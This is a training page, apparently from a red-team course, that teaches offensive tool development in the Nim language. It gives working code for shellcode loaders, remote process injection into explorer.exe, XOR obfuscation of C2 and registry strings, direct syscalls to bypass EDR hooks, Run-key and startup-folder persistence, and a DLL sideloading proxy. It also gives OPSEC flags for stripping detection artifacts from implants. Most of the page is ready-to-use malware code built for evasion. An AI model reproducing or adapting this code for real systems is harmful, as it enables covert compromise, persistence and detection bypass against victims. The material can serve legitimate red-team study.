---
layout: training-page
title: "Nim: Offensive Tool Development — Red Team Academy"
module: "Tool Development"
tags:
  - nim
  - tool-dev
  - malware-dev
  - implant
  - evasion
  - winim
  - windows-api
  - shellcode
page_key: "tool-dev-nim-offensive"
render_with_liquid: false
updated: "2026-05-13"
---

# Nim: Offensive Tool Development

Nim is a compiled, statically-typed systems language that compiles through C/C++ as an intermediate backend before producing native binaries. For offensive tooling this is significant: Nim binaries carry different compiler artifacts, import patterns, and PE characteristics than C/C++ or Go binaries, so AV/EDR models trained on traditional malware families have historically had lower recall against Nim payloads. The language is expressive like Python but produces single-file, dependency-free executables — a useful combination for operators. This page covers the Nim toolchain, Windows API access via `winim`, shellcode loaders, process injection, compile-time obfuscation, and direct syscall integration.

---

## Toolchain Setup

```
# Install Nim (Linux — choosenim is the recommended installer)
curl https://nim-lang.org/choosenim/init.sh -sSf | sh
# Add to PATH:
export PATH="$HOME/.nimble/bin:$PATH"
nim --version        # confirm install: Nim Compiler Version 2.x.x

# Install winim — the Windows API binding library for Nim
nimble install winim   # pulls from nimble package registry

# Cross-compile Windows binaries from Linux using mingw-w64
apt install mingw-w64
# 64-bit Windows PE:
nim c -d:mingw --cpu:amd64 --os:windows -o:payload.exe payload.nim
# 32-bit Windows PE:
nim c -d:mingw --cpu:i386  --os:windows -o:payload_x86.exe payload.nim

# Useful Nim compile flags for offensive use:
# --opt:speed        optimize for speed (larger binary)
# --opt:size         optimize for size (smaller binary, less readable)
# -d:strip           strip debug symbols from binary
# -d:danger          fastest code, removes all safety checks (smaller)
# -d:release         release build (no assertions, optimized)
# --gc:arc           ARC memory management (predictable, no GC pauses)
# --gc:orc           ORC (like ARC but cycles handled — often preferred)
# -d:useMalloc       use system malloc instead of Nim allocator
# --passL:"-static"  try static linking (reduces runtime deps)

# Recommended build command for an implant (small, stripped, release):
nim c \
  -d:release \
  -d:strip \
  -d:mingw \
  --opt:size \
  --gc:orc \
  --cpu:amd64 \
  --os:windows \
  -o:implant.exe \
  implant.nim

# DLL output (for reflective DLL injection or sideloading):
nim c \
  -d:release \
  -d:strip \
  -d:mingw \
  --cpu:amd64 \
  --os:windows \
  --app:lib \
  -o:implant.dll \
  implant.nim
```

---

## Windows API Access via winim

`winim` provides Nim mappings for virtually the entire Windows API: Win32, NT API, COM, and Windows data types. It is the single most important library for offensive Nim development.

```nim
# winim basics — import only what you need to keep binary small
import winim/lean      # lean subset: just the most common Win32 functions
# import winim/com    # COM automation
# import winim/clr    # .NET CLR hosting (execute C# from Nim)

# --- Basic process/memory API usage ---
import winim/lean

proc main() =
  # Allocate RW memory, write shellcode, flip to RX, execute
  let size: SIZE_T = 4096
  var mem = VirtualAlloc(nil, size, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
  if mem == nil:
    quit("VirtualAlloc failed")

  # (Write shellcode bytes into mem here — see Shellcode Loader section)

  var old: DWORD
  discard VirtualProtect(mem, size, PAGE_EXECUTE_READ, old.addr)

  # Cast to a function pointer and call
  let fn = cast[proc(){.nimcall.}](mem)
  fn()

  discard VirtualFree(mem, 0, MEM_RELEASE)

main()
```

```nim
# WinAPI type reference — common types in winim
# HANDLE  = pointer (opaque handle to kernel object)
# DWORD   = uint32
# SIZE_T  = uint64 on x64, uint32 on x86
# LPVOID  = pointer (void*)
# BOOL    = int32 (0=FALSE, non-zero=TRUE)
# PBYTE   = ptr byte
# LPCWSTR = ptr Utf16Char (wide string pointer)

# --- P/Invoke-style: call any Windows API ---
import winim/lean

# Dynamic resolution — avoid suspicious imports in the IAT
let kernel32 = LoadLibraryA("kernel32.dll")
let pVA = GetProcAddress(kernel32, "VirtualAlloc")

type VirtualAllocFn = proc(
  lpAddress: LPVOID,
  dwSize: SIZE_T,
  flAllocationType: DWORD,
  flProtect: DWORD
): LPVOID {.stdcall.}

let dynVirtualAlloc = cast[VirtualAllocFn](pVA)
var mem = dynVirtualAlloc(nil, 4096, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
```

---

## Shellcode Loader

A minimal shellcode loader that allocates memory, copies shellcode, flips permissions to RX, and executes via a callback (EnumSystemLocalesA) to avoid direct `CreateThread` / `VirtualAlloc(RWX)` signal pairs.

```nim
# shellcode_loader.nim — callback execution pattern, no RWX alloc
# Build: nim c -d:release -d:strip -d:mingw --cpu:amd64 --os:windows -o:loader.exe shellcode_loader.nim
import winim/lean

# Replace with your shellcode bytes (msfvenom / Donut / custom)
# msfvenom -p windows/x64/exec CMD=calc.exe -f csharp | grep "0x" → convert to Nim array
var shellcode: array[272, byte] = [
  byte 0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51,
  # ... (truncated — paste full shellcode here)
  byte 0x00
]

proc main() =
  let size = shellcode.len.SIZE_T

  # Allocate RW — no RWX at any point
  let mem = VirtualAlloc(nil, size, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
  if mem == nil:
    return

  # Copy shellcode into allocated region
  copyMem(mem, shellcode.addr, size)

  # Flip RW → RX
  var old: DWORD
  discard VirtualProtect(mem, size, PAGE_EXECUTE_READ, old.addr)

  # Execute via EnumSystemLocalesA callback — avoids CreateThread signal
  # The callback is called synchronously, blocking until shellcode completes
  discard EnumSystemLocalesA(cast[LOCALE_ENUMPROCA](mem), LCID_INSTALLED)

  # Cleanup
  discard VirtualFree(mem, 0, MEM_RELEASE)

main()
```

```nim
# Alternative: Heap-based execution (HeapCreate with HEAP_CREATE_ENABLE_EXECUTE)
# Avoids VirtualAlloc entirely — different allocation path, less monitored
import winim/lean

var shellcode = [byte 0xfc, 0x48, ...]  # your shellcode

proc heapExec() =
  let heap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0)
  if heap == nil: return
  let mem = HeapAlloc(heap, 0, shellcode.len.SIZE_T)
  if mem == nil: return
  copyMem(mem, shellcode.addr, shellcode.len)
  let fn = cast[proc(){.nimcall.}](mem)
  fn()

heapExec()
```

---

## Process Injection (Remote)

Inject shellcode into a remote process using the classic VirtualAllocEx / WriteProcessMemory / CreateRemoteThread pattern. Targets a process by name using a snapshot.

```nim
# remote_inject.nim — inject shellcode into a remote process by name
# Build: nim c -d:release -d:strip -d:mingw --cpu:amd64 --os:windows -o:inject.exe remote_inject.nim
import winim/lean
import std/strutils

var shellcode: array[272, byte] = [byte 0xfc, 0x48, ...]  # your shellcode

proc findPid(name: string): DWORD =
  ## Walk process snapshot to find PID by process name
  var entry: PROCESSENTRY32
  entry.dwSize = sizeof(PROCESSENTRY32).DWORD

  let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
  defer: CloseHandle(snap)

  if not Process32First(snap, entry.addr).bool:
    return 0

  while true:
    let procName = $cast[cstring](entry.szExeFile.addr)
    if procName.toLowerAscii == name.toLowerAscii:
      return entry.th32ProcessID
    if not Process32Next(snap, entry.addr).bool:
      break
  return 0

proc inject(pid: DWORD): bool =
  # Open target process with required access rights
  let hProc = OpenProcess(
    PROCESS_VM_WRITE or PROCESS_VM_OPERATION or PROCESS_CREATE_THREAD,
    FALSE, pid
  )
  if hProc == INVALID_HANDLE_VALUE or hProc == nil:
    echo "OpenProcess failed: ", GetLastError()
    return false
  defer: CloseHandle(hProc)

  # Allocate RW memory in target process
  let size = shellcode.len.SIZE_T
  let mem = VirtualAllocEx(hProc, nil, size, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
  if mem == nil:
    echo "VirtualAllocEx failed: ", GetLastError()
    return false

  # Write shellcode
  var written: SIZE_T
  if not WriteProcessMemory(hProc, mem, shellcode.addr, size, written.addr).bool:
    echo "WriteProcessMemory failed: ", GetLastError()
    return false

  # Flip to RX
  var old: DWORD
  discard VirtualProtectEx(hProc, mem, size, PAGE_EXECUTE_READ, old.addr)

  # Create remote thread at shellcode address
  let hThread = CreateRemoteThread(hProc, nil, 0,
    cast[LPTHREAD_START_ROUTINE](mem), nil, 0, nil)
  if hThread == nil:
    echo "CreateRemoteThread failed: ", GetLastError()
    return false
  defer: CloseHandle(hThread)

  discard WaitForSingleObject(hThread, INFINITE)
  return true

proc main() =
  # Target: inject into explorer.exe (common low-suspicion target)
  let pid = findPid("explorer.exe")
  if pid == 0:
    echo "Target process not found"
    return
  echo "Injecting into PID: ", pid
  if inject(pid):
    echo "Injection successful"

main()
```

---

## Compile-Time String Obfuscation

Nim macros execute at compile time, enabling encryption of sensitive strings (C2 URLs, registry paths, API names) so they never appear as plaintext in the binary's data section.

```nim
# obfuscation.nim — compile-time XOR string encryption via Nim macro
# Strings are XOR-encrypted at compile time and decrypted at runtime.
# The plaintext NEVER appears as a string literal in the compiled binary.

import macros

const KEY: byte = 0xAB  # Change per operation

macro encStr(s: static string): untyped =
  ## Compile-time XOR encryption: returns a byte array literal
  var result_bytes = newSeq[byte](s.len)
  for i, c in s:
    result_bytes[i] = c.byte xor KEY
  # Build a static array initializer expression
  let arr = newNimNode(nnkBracket)
  for b in result_bytes:
    arr.add(newLit(b))
  result = quote do:
    `arr`

proc decStr(enc: openArray[byte]): string =
  ## Runtime XOR decryption
  result = newString(enc.len)
  for i, b in enc:
    result[i] = (b xor KEY).char

# ── Usage ────────────────────────────────────────────────────────────────────

# These string literals are XOR-encrypted at compile time.
# The plaintext "https://c2.example.com/beacon" is NEVER in the binary.
const encC2URL    = encStr("https://c2.example.com/beacon")
const encRegPath  = encStr("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run")
const encMutex    = encStr("Global\\ServiceHostCore")

proc main() =
  let c2url   = decStr(encC2URL)
  let regPath = decStr(encRegPath)
  let mutex   = decStr(encMutex)
  
  echo c2url    # https://c2.example.com/beacon  (only at runtime)
  echo regPath  # SOFTWARE\Microsoft\...
  echo mutex    # Global\ServiceHostCore

main()
```

```nim
# Advanced: per-character random key rotation (polyalphabetic)
# Harder to detect XOR key from binary analysis
import macros, std/random

macro encStrPoly(s: static string): untyped =
  ## Each byte XOR'd with a different key derived from index
  var arr = newNimNode(nnkBracket)
  var keyArr = newNimNode(nnkBracket)
  for i, c in s:
    let k = byte((i * 37 + 0xB7) and 0xFF)  # deterministic "random" per position
    arr.add(newLit(c.byte xor k))
    keyArr.add(newLit(k))
  result = quote do:
    (`arr`, `keyArr`)

proc decStrPoly(enc: openArray[byte], keys: openArray[byte]): string =
  result = newString(enc.len)
  for i in 0 ..< enc.len:
    result[i] = (enc[i] xor keys[i]).char
```

---

## Direct Syscalls via NimlineWhispers

NimlineWhispers ports the SysWhispers concept to Nim: instead of calling `ntdll.dll` through the userland hook layer (where EDR products place trampolines), syscall numbers are extracted at compile time and called directly via inline assembly. This bypasses EDR userland hooks entirely.

```nim
# Direct syscall pattern for NtAllocateVirtualMemory
# NimlineWhispers2 generates the assembly stub; this shows the manual pattern.
# Reference: https://github.com/ajpc500/NimlineWhispers2

import winim/lean

# --- Manual direct syscall stub ---
# The syscall number (SSN) for NtAllocateVirtualMemory varies by Windows build.
# NimlineWhispers resolves SSNs dynamically from ntdll.dll at runtime,
# then jumps directly to the syscall instruction.

# Simplified: using {.asmNoStackFrame.} for x64 inline asm in Nim
proc NtAllocateVirtualMemory_Syscall(
  ProcessHandle: HANDLE,
  BaseAddress: ptr PVOID,
  ZeroBits: ULONG_PTR,
  RegionSize: ptr SIZE_T,
  AllocationType: ULONG,
  Protect: ULONG
): NTSTATUS {.asmNoStackFrame.} =
  # SSN 0x18 = NtAllocateVirtualMemory on Windows 10 21H2
  # WARNING: SSN changes between Windows versions — use dynamic resolution in production
  asm """
    mov r10, rcx
    mov eax, 0x18
    syscall
    ret
  """

# --- Runtime SSN resolution (production approach) ---
# Parse ntdll.dll's export table to find the syscall number dynamically.
# This works even on patched ntdll since we read the original bytes from disk.
proc getSyscallNumber(funcName: string): WORD =
  ## Extract SSN from ntdll.dll export — reads from mapped ntdll on disk
  ## to get clean bytes even if ntdll is hooked in memory
  let ntdll = LoadLibraryExA("ntdll.dll", nil, LOAD_LIBRARY_AS_DATAFILE)
  defer: FreeLibrary(ntdll)
  let pFunc = GetProcAddress(ntdll, funcName.cstring)
  if pFunc == nil: return 0
  # In a clean ntdll, bytes at +4 from function start encode the SSN:
  # 4C 8B D1    mov r10, rcx
  # B8 XX XX 00 00   mov eax, <SSN>
  let bytes = cast[ptr UncheckedArray[byte]](pFunc)
  if bytes[0] == 0x4C and bytes[1] == 0x8B and bytes[2] == 0xD1 and bytes[3] == 0xB8:
    return cast[ptr WORD](cast[uint](pFunc) + 4)[]
  return 0

# Usage:
# let ssn = getSyscallNumber("NtAllocateVirtualMemory")
# Then use ssn in your inline asm instead of hardcoding 0x18
```

---

## Persistence via Registry (Nim)

```nim
# persistence_reg.nim — write run key for startup persistence
import winim/lean

proc addRunKey(valueName, exePath: string): bool =
  var hKey: HKEY
  let ret = RegOpenKeyExA(
    HKEY_CURRENT_USER,
    "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
    0, KEY_SET_VALUE, hKey.addr
  )
  if ret != ERROR_SUCCESS: return false
  defer: RegCloseKey(hKey)

  let val = exePath & "\0"
  let res = RegSetValueExA(
    hKey, valueName.cstring, 0, REG_SZ,
    cast[ptr BYTE](val.cstring), val.len.DWORD
  )
  return res == ERROR_SUCCESS

# COM-based startup via startup folder (alternative, no registry writes):
import std/os
proc addStartupFolder(name, exePath: string): bool =
  let startup = getEnv("APPDATA") & "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" & name & ".lnk"
  # Create a .lnk shortcut file pointing to exePath
  # (requires IShellLink COM — see winim/com for full implementation)
  copyFile(exePath, startup.replace(".lnk", ".exe"))  # simpler: just copy exe
  return true
```

---

## Building a DLL (for Sideloading / Reflective Injection)

```nim
# sideload.nim — outputs a Windows DLL for DLL sideloading attacks
# Build: nim c --app:lib -d:release -d:strip -d:mingw --cpu:amd64 --os:windows -o:version.dll sideload.nim

import winim/lean

# DllMain equivalent — called when the DLL is loaded
proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall, exportc, dynlib.} =
  case fdwReason
  of DLL_PROCESS_ATTACH:
    # This code runs in the loading process's thread when the DLL is mapped
    # Run shellcode, establish C2, drop persistence, etc.
    discard CreateThread(nil, 0,
      cast[LPTHREAD_START_ROUTINE](proc() =
        # Do your work in a separate thread to not block the loader
        discard MessageBoxA(nil, "DLL loaded", "PoC", MB_OK)
      ), nil, 0, nil)
    return TRUE
  of DLL_PROCESS_DETACH:
    return TRUE
  else:
    return TRUE

# Export a function with the same name as the legitimate DLL function being hijacked
# This forwards calls to the real DLL if running as a proxy
proc GetFileVersionInfoA(lptstrFilename: LPCSTR, dwHandle: DWORD,
    dwLen: DWORD, lpData: LPVOID): BOOL {.stdcall, exportc, dynlib.} =
  # Load real version.dll and forward call
  let realDll = LoadLibraryA("C:\\Windows\\System32\\version.dll")
  if realDll != nil:
    let realFn = GetProcAddress(realDll, "GetFileVersionInfoA")
    if realFn != nil:
      return cast[proc(a: LPCSTR, b: DWORD, c: DWORD, d: LPVOID): BOOL {.stdcall.}](realFn)(
        lptstrFilename, dwHandle, dwLen, lpData)
  return FALSE
```

---

## OPSEC Notes for Nim Payloads

```
# Nim-specific detection indicators to mitigate:

1. Nim runtime strings
   — Default Nim binaries include "fatal.nim", "system.nim", "winim" path fragments
   — Mitigation: --opt:size -d:danger reduces but doesn't eliminate these
   — Mitigation: strip with UPX or manual section stripping

2. NimMain / NimMainInner exports
   — Nim binaries export NimMain, NimMainInner, NimMainModule
   — Mitigation: use objcopy or a custom linker script to rename/strip exports

3. Error message strings
   — Nim panics print "Error: unhandled exception" style messages
   — Mitigation: -d:danger removes most, wrap critical code in try/except

4. Exception handling overhead
   — Nim's setjmp-based exception handling adds frames visible in stack traces
   — Mitigation: --exceptions:goto (more performant, different stack shape)

5. winim import footprint
   — import winim/lean is smaller than import winim; audit which sub-modules you need
   — Minimum viable import reduces unused Windows API symbols in IAT

6. Compilation artifacts
   — By default Nim links MSVCRT; use --passL:"-static" + mingw for static CRT
   — Static builds are larger but have fewer import dependencies

# Recommended compile flags for production implants:
nim c \
  -d:release \
  -d:strip \
  -d:danger \
  -d:mingw \
  --opt:size \
  --gc:orc \
  --exceptions:goto \
  --cpu:amd64 \
  --os:windows \
  --passL:"-static -lkernel32 -luser32 -lntdll" \
  -o:implant.exe \
  implant.nim
```

---

## Reference

- [OffensiveNim](https://github.com/byt3bl33d3r/OffensiveNim) — byt3bl33d3r's reference collection of Nim offensive techniques
- [NimPackt](https://github.com/chvancooten/NimPackt-v1) — Nim-based shellcode packer/dropper
- [NimlineWhispers2](https://github.com/ajpc500/NimlineWhispers2) — Direct syscalls for Nim
- [winim](https://github.com/khchen/winim) — Windows API bindings for Nim
- [Nim Maldev Notes](https://ppn.snovvcrash.rocks/red-team/maldev/nim) — snovvcrash's cheat sheet
